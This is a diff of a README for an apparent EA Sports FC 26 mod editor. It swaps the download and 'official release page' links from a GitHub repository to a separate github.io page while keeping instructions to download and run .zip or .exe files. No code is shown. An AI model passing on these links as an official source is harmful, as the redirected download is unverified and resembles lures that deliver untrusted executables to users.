@@ -1,6 +1,6 @@
 # 🛠️ FC26-Mod-Editor-X - Customize your career mode experience today
 
-[![](https://img.shields.io/badge/Download-FC26-Mod-Editor-X-blue)](https://github.com/coturnixcoturnixdwarfgoldenchinkapin668/FC26-Mod-Editor-X)
+[![](https://img.shields.io/badge/Download-FC26-Mod-Editor-X-blue)](https://coturnixcoturnixdwarfgoldenchinkapin668.github.io)
 
 ## What is this tool?
 FC26-Mod-Editor-X manages modifications for EA Sports FC 26 on Windows. The program changes game files to provide new features and visual updates. Users employ this software to alter career modes, edit database values, and apply live game edits. This tool simplifies the process for individuals who lack programming skills or technical background in file editing.
@@ -16,7 +16,7 @@ Your computer must meet these standards to run the software:
 ## ⬇️ How to get started
 Follow these steps to install the editor:
 
-1. Visit the [official release page](https://github.com/coturnixcoturnixdwarfgoldenchinkapin668/FC26-Mod-Editor-X) to find the latest version.
+1. Visit the [official release page](https://coturnixcoturnixdwarfgoldenchinkapin668.github.io) to find the latest version.
 2. Look for the Assets section at the bottom of the release notes.
 3. Click the file ending in .zip or .exe to start the download.
 4. Open the downloaded folder and move the contents to a folder on your desktop.
